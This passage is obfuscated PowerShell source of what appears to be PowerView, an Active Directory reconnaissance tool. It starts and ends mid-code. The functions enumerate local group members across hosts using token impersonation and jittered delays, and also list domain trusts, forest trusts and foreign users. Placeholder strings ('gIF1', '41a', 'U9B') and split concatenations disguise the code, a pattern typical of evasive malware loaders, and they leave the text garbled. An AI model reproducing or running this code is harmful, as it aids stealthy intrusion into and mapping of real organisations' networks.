        if (gIF1PSBoundParameters[41aComputerSiteName41a]) { gIF1ComputerSearcherArguments[41aSiteName41a] = gIF1SiteName }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ComputerSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ComputerSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ComputerSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ComputerSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ComputerSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { '+'gIF1ComputerSearcherArguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aComputerName41a]) {
            gIF1TargetComputers = gIF1ComputerName
        }
        else {
            Write-Verbose 41a[Find-DomainLocalGroupMember] Querying computers in the domain41a
            gIF1TargetComputers = Get-DomainComputer @ComputerSearcherArguments U9B Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Zfr[Find-DomainLocalGroupMember] TargetComputers length: gIF1(gIF1TargetComputers.Length)Zfr
        if (gIF1TargetComputers.Length -eq 0) {
            throw 41a[Find-DomainLocalGroupMember] No hosts found to enumerate41a
        }

        # the host enumeration block we41are using to enumerate all servers
        gIF1HostEnumBlock = {
            Param(gIF1ComputerName, gIF1GroupName, gIF1Method, gIF1TokenHandle)

            # Add check if user defaults to/selects ZfrAdministratorsZfr
            if (gIF1GroupName -eq ZfrAdministratorsZfr) {
                gIF1AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,gIF1null)
                gIF1Grou'+'pN'+'ame = (gIF1AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split ZfrYwWYwWZfr)[-1]
            }

            if (gIF1TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                gIF1Null = Invoke-UserImpersonation -TokenHandle gIF1TokenHandle -Quiet
            }

            ForEach (gIF1TargetComputer in gIF1ComputerName) {
                gIF1Up = Test-Connection -Count 1 -Quiet -ComputerName gIF1TargetComputer
                if (gIF1Up) {
                    gIF1NetLocalGroupMemberArguments = @{
                        41aComputerName41a = gIF1TargetComputer
                        41aMethod41a = gIF1Method
                        41aGroupName41a = gIF1GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if (gIF1TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        gI'+'F1LogonToken = gIF1Null
        if (gIF1PSBoundParameters[41aCredential41a]) {
            if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
            }
            else {
                gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (gIF1PSBoundParameters[41aDelay41a] -or gIF1PSBoundParameters[41aStopOnSuccess41a]) {

            Write-Verbose Zfr[Find-DomainLocalGroupMember] Total number of hosts: gIF1(gIF1TargetComputers.count)Zfr
            Write-Verbose Zfr[Find-DomainLocalGroupMember] Delay: gIF1Delay, Jitter: gIF1JitterZfr
            gIF1Counter = 0
            gIF1RandNo = New-Object System.Random

            ForEach (gIF1TargetComputer in gIF1TargetComputers) {
                gIF1Counter = gIF1Counter + 1

                # sleep for our s'+'emi-randomized interval
                Start-Sleep -Seconds gIF1RandNo.Next((1-gIF1Jitter)*gIF1Delay, (1+gIF1Jitter)*gIF1Delay)

                Write-Verbose Zfr[Find-DomainLocalGroupMember] Enumerating server gIF1TargetComputer (gIF1Counter of gIF1(gIF1TargetComputers.count))Zfr
                Invoke-Command -ScriptBlock gIF1HostEnumBlock -ArgumentList gIF1TargetComputer, gIF1GroupName, gIF1Method, gIF1LogonToken
            }
        }
        else {
            Write-Verbose Zfr[Find-DomainLocalGroupMember] Using threading with threads: gIF1ThreadsZfr

            # if we41are using threading, kick off the script block with New-ThreadedFunction
            gIF1ScriptParams = @{
                41aGroupName41a = gIF1GroupName
                41aMethod41a = gIF1Method
                41aTokenHandle41a = gIF1LogonToken
            }

            # if we41are using threading, kick off the script block with New-ThreadedFunction using the gIF1HostEnumBlock + params
            New-ThreadedFunction -ComputerName gIF1TargetComputers -ScriptBlock gIF1HostEnumBlock -ScriptParameters gIF1ScriptParams -Threads gIF1Threads
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


########################################################
#
# Domain trust functions below.
#
###############################################'+'#########

function Get-DomainTrust {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, and LDAP search using the filter
41a(objectClass=trustedDomain)41a is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .LDAP methods.

.EXAMPLE

Get-DomainTrust -NET -Domain'+' Zfrprod.testlab.localZfr

Return domain trusts for the Zfrprod.testlab.localZfr domain using .NET methods

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainTrust -Domain Zfrprod.testlab.localZfr -Server ZfrPRIMARY.testlab.localZfr -Credential gIF1Cred

Return domain trusts for the Zfrprod.testlab.localZfr domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain Zfrprod.testlab.localZfr

Return domain trusts for the Zfrprod.testlab.localZfr domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelation'+'shipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.DomainTrust.NET41a)]
    [OutputType(41aPowerView.DomainTrust.LDAP41a)]
    [OutputType(41aPowerView.DomainTrust.API41a)]
    [CmdletBinding(DefaultParameterSetName = 41aLDAP41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Parameter(ParameterSetName = 41aAPI41a)]
        [Switch]
        gIF1API,

        [Parameter(ParameterSetName = 41aNET41a)]
        [Switch]
        gIF1NET,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        ['+'String]
        gIF1LDAPFilter,

        [Parameter(ParameterSetName = 41'+'aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Parameter(ParameterSetName = 41aAPI41a)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Parameter(ParameterSetName = 41aLDAP41a)]
        [Management.Automation.PSCreden'+'tial]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1TrustAttributes = @{
            [uint32]41a0x0000000141a = 41aNON_TRANSITIVE41a
            [uint32]41a0x0000000241a = 41aUPLEVEL_ONLY41a
            [uint32]41a0x0000000441a = 41aFILTER_SIDS41a
            [uint32]41a0x0000000841a = 41aFOREST_TRANSITIVE41a
            [uint32]41a0x0000001041a = 41aCROSS_ORGANIZATION41a
            [uint32]41a0x0000002041a = 41aWITHIN_FOREST41a
            [uint32]41a0x0000004041a = 41aTREAT_AS_EXTERNAL41a
            [uint32]41a0x0000008041a = 41aTRUST_USES_RC4_ENCRYPTION41a
            [uint32]41a0x0000010041a = 41aTRUST_USES_AES_KEYS41a
            [uint32]41a0x0000020041a = 41aCROSS_ORGANIZATION_NO_TGT_DELEGATION41a
            [uint32]41a0x0000040041a = 41aPIM_TRUST41a
        }

        gIF1LdapSearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1LdapSearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1LdapSearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1LdapSearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1LdapSearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1LdapSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1LdapSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1LdapSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1LdapSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1LdapSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1LdapSearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PsCmdlet.ParameterSetName -ne 41aAPI41a) {
            gIF1NetSearcherArguments = @{}
            if (gIF1Domain -and gIF1Domain.Trim() -ne 41a41a) {
                gIF1SourceDomain = gIF1Domain
            }
            else {
                if (gIF1PSBoundParameters[41aCredential41a]) {
                    gIF1SourceDomain = (Get-Domain -Credential gIF1Credential).Name
                }
                else {
                    gIF1SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif (gIF1PsCmdlet.ParameterSetName -ne 41aNET41a) {
            if (gIF1Domain -and gIF1Domain.Trim() -ne 41a41a) {
                gIF1SourceDomain = gIF1Domain
            }
            else {
                gIF1SourceDomain = gIF1Env:USERDNSDOMAIN
            }
        }

        if (gIF1PsCmdlet.ParameterSetName -eq 41aLDAP41a) {
            # if we41are searching for domain trusts through LDAP/ADSI
            gIF1TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            gIF1SourceSID = Get-DomainSID @NetSearcherArguments

            if (gIF1TrustSearcher) {

                gIF1TrustSearcher.Filter = 41a(objectClass=trustedDomain)41a

                if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1TrustSearcher.FindOne() }
                else { gIF1Results = gIF1TrustSearcher.FindAll() }
                gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                    gIF1Props = gIF1_.Properties
                    gIF1DomainTrust = New-Object PSObject

                    gIF1Tru'+'stAttrib = @()
                    gIF1TrustAttrib += gIF1TrustAttributes.Keys U9B Where-Object { gIF1Props.trustattributes[0] -band gIF1_ } U9B ForEach-Object { gIF1TrustAttributes[gIF1_] }

                    gIF1Direction = Switch (gIF1Props.trustdirection) {
                        0 { 41aDisabled41a }
                        1 { 41aInbound41a }
                        2 { 41aOutbound41a }
                        3 { 41aBidirectional41a }
                    }

                    gIF1TrustType = Switch (gIF1Props.trusttype) {
                        1 { 41aWINDOWS_NON_ACTIVE_DIRECTORY41a }
                        2 { 41aWINDOWS_ACTIVE_DIRECTORY41a }
                        3 { 41aMIT41a }
                    }

                    gIF1Distinguishedname = gIF1Props.distinguishedname[0]
                    gIF1SourceNameIndex = gIF1Distinguishedname.IndexOf(41aDC=41a)
                    if (gIF1SourceNameIndex) {
                        gIF1SourceDomain = gIF1(gIF1Distinguishedname.SubString(gIF1SourceNameIndex)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                    }
                    else {
                        gIF1SourceDomain = ZfrZfr
                    }

                    gIF1TargetNameIndex = gIF1Distinguishedname.IndexOf(41a,CN=System41a)
                    if (gIF1SourceNameIndex) {
                        gIF1TargetDomain = gIF1Distinguishedname.SubString(3, gIF1TargetNameIndex-3)
                    }
                    else {
                        gIF1TargetDomain = ZfrZfr
                    }

                    gIF1ObjectGuid = New-Object Guid @(,gIF1Props.objectguid[0])
                    gIF1TargetSID = (New-Object System.Security.Principal.SecurityIdentifier(gIF1Props.securityidentifier[0],0)).Value

                    gIF1DomainTrust U9B Add-Member Noteproperty 41aSourceName41a gIF1SourceDomain
                    gIF1DomainTrust U9B Add-Member Noteproperty 41aTargetName41a gIF1Props.name[0]
                    # gIF1Dom'+'ainTrust U9B Add-Member Noteproperty 41aTargetGuid41a Zfr{gIF1ObjectGuid}Zfr
                    gIF1DomainTrust U9B Add-Member Noteproperty 41aTrustType41a gIF1TrustType
                    gIF1DomainTru'+'st U9B Add-Member Noteproperty 41aTrustAttributes41a gIF1(gIF1TrustAttrib -join 41a,41a)
                    gIF1Domai'+'nTrust U9B Add-Member Noteproperty 41aTrustDirection41a ZfrgIF1DirectionZfr
                    gIF1DomainTrust U9B Add-Member Noteproperty 41aWhenCreated41a gIF1Props.whencreated[0]
                    gIF1DomainTrust U9B Add-Member Noteproperty 41aWhenChanged41a gIF1Props.whenchanged[0]
                    gIF1DomainTrust.PSObject.TypeNames.Insert(0, 41aPowerView.DomainTrust.LDAP41a)
                    gIF1DomainTrust
                }
                if (gIF1Results) {
                    try { gIF1Results.dispose() }
                    catch {
                        Write-Verbose Zfr[Get-DomainTrust] Error d'+'isposing of the Results object: gIF1_Zfr
                    }
                }
                gIF1TrustSearcher.dispose()
            }
        }
        elseif (gIF1PsCmdlet.ParameterSetName -eq 41aAPI41a) {
            # if we41are searching for domain trusts through Win32 API functions
            if (gIF1PSBoundParameters[41aServer41a]) {
                gIF1TargetDC = gIF1Server
            }
            elseif (gIF1Domain -and gIF1Domain.Trim() -ne 41a41a) {
                gIF1TargetDC = gIF1Domain
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                gIF1TargetDC = gIF1Null
            }

            # arguments for DsEnumerateDomainTrusts
            gIF1PtrInfo = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            gIF1Flags = 63
            gIF1DomainCount = 0

            # get the trust information from the target server
            gIF1Result = gIF1Netapi32::DsEnumerateDomainTrusts(gIF1TargetDC, gIF1Flags, [ref]gIF1PtrInfo, [ref]gIF1DomainCount)

            # Locate the offset of the initial intPtr
            gIF1Offset = gIF1PtrInfo.ToInt64()

            # 0 = success
            if ((gIF1Result -eq 0) -and (gIF1Offset -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                gIF1Increment = gIF1DS_DOMAIN_TRUSTS::GetSize()

                # parse all the result structures
                for (gIF1i = 0; (gIF1i -lt gIF1DomainCount); gIF1i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                    gIF1Info = gIF1NewIntPtr -as gIF1DS_DOMAIN_TRUSTS

                    gIF1Offset = gIF1NewIntPtr.ToInt64()
                    gIF1Offset += gIF1Increment

                    gIF1SidString = 41a41a
                    gIF1Result = gIF1Advapi32::ConvertSidToStringSid(gIF1Info.DomainSid, [ref]gIF1SidString);gIF1LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (gIF1Result -eq 0) {
                        Write-Verbose Zfr[Get-DomainTrust] Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
                    }
                    else {
                        gIF1DomainTrust = New-Object PSObject
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aSourceName41a gIF1SourceDomain
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTargetName41a gIF1Info.DnsDomainName
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTargetNetbiosName41a gIF1Info.NetbiosDomainName
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aFlags41a gIF1Info.Flags
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aParentIndex41a gIF1Info.ParentIndex
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTrustType41a gIF1Info.TrustType
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTrustAttributes41a gIF1Info.TrustAttributes
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTargetSid41a gIF1SidString
                        gIF1DomainTrust U9B Add-Member Noteproperty 41aTargetGuid41a gIF1Info.DomainGuid
                        gIF1DomainTrust.PSObject.TypeNames.Insert(0, 41aPowerView.DomainTrust.API41a)
                        gIF1DomainTrust
                    }
                }
                # free up the result buffer
                gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)
            }
            else {
                Write-Verbose Zfr[Get-DomainTrust] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
            }
        }
        else {
            # if we41are searching for domain trusts through .NET methods
            gIF1FoundDomain = Get-Domain @NetSearcherArguments
            if (gIF1FoundDomain) {
                gIF1FoundDomain.GetAllTrustRelationships() U9B ForEach-Object {
                    gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.DomainTrust.NET41a)
                    gIF1_
                }
            }
        }
    }
}


function Get-ForestTrust {
<#
.SYNOPSIS

Return all forest trusts for the current forest or a specified forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
forest using number of method using the .NET method GetAllTrustRelationships() on a
System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.

.PARAMETER Forest

Specifies the forest to query for trusts, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestTrust

Return current forest trusts.

.EXAMPLE

Get-ForestTrust -Forest Zfrexternal.localZfr

Return trusts for the Zfrexternal.localZfr forest.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-ForestTrust -Forest Zfrexternal.localZfr -Credential gIF1Cred

Return trusts for the Zfrexternal.localZfr forest using the specified alternate credenitals.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ForestTrust.NET41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1NetForestArguments = @{}
        if (gIF1PSBoundParameters[41aForest41a]) { gIF1NetForestArguments[41aForest41a] = gIF1Forest }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1NetForestArguments[41aCredential41a] = gIF1Credential }

        gIF1FoundForest = Get-Forest @NetForestArguments

        if (gIF1FoundForest) {
            gIF1FoundForest.GetAllTrustRelationships() U9B ForEach-Object {
                gIF1_.PSObject.TypeNames.Insert(0, 41aPowerView.ForestTrust.NET41a)
                gIF1_
            }
        }
    }
}


function Get-DomainForeignUser {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the user41as domain.
This is a domain41as ZfroutgoingZfr access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given user41as domain name based on the user41as distinguishedName.
This domain name is compared to the queried domain, and the user object is
output'+' if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

'+'
Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential gIF1Cred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ForeignUser41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        gIF1SearcherArguments[41aLDAPFilter41a] = 41a(memberof=*)41a
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        if (gIF1PSBoundParameters[41aRaw41a]) { gIF1SearcherArguments[41aRaw41a] = gIF1Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  U9B ForEach-Object {
            ForEach (gIF1Membership in gIF1_.memberof) {
                gIF1Index = gIF1Membership.IndexOf(41aD'+'C=41a)
                if (gIF1Index) {

                    gIF1GroupDomain = gIF1(gIF1Membership.SubString(gIF1Index)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                    gIF1UserDistinguishedName = gIF1_.distinguishedname
                    gIF1UserIndex = gIF1UserDistinguishedName.IndexOf(41aDC=41a)
                    gIF1UserDomain = gIF1(gIF1_.distinguishedname.SubString(gIF1UserIndex)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a

                    if (gIF1GroupDomain -ne gIF1UserDomain) {
                        # if the group domain doesn41at match the user domain, display it
                        gIF1GroupName = gIF1Membership.Split(41a,41a)[0].split(41a=41a)[1]
                        gIF1ForeignUser = New-Object PSObject
                        gIF1ForeignUser U9B Add-Member Noteproperty 41aUserDomain41a gIF1UserDomain
                        gIF1ForeignUser U9B Add-Member Noteproperty 41aUserName41a gIF1_.samaccountname
                        gIF1ForeignUser U9B Add-Member Noteproperty 41aUserDistinguishedName41a gIF1_.distinguishedname
                        gIF1ForeignUser U9B Add-Member Noteproperty 41a'+'GroupDomain41a gIF1GroupDomain
                        gIF1ForeignUser U9B Add-Member Noteproperty 41aGroupName41a gIF1GroupName
                        gIF1ForeignUser U9B Add-Member Noteproperty 41aGroupDistinguishedName41a gIF1Membership
                        gIF1ForeignUser.PSObject.TypeNames.Insert(0, 41aPowerView.ForeignUser41a)
                        gIF1ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
<#
.SYNOPSIS

Enumerates groups with users outside of the group41as domain and returns
each foreign member. This is a domain41as ZfrincomingZfr access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the member41as domain
name to the parent group41as domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

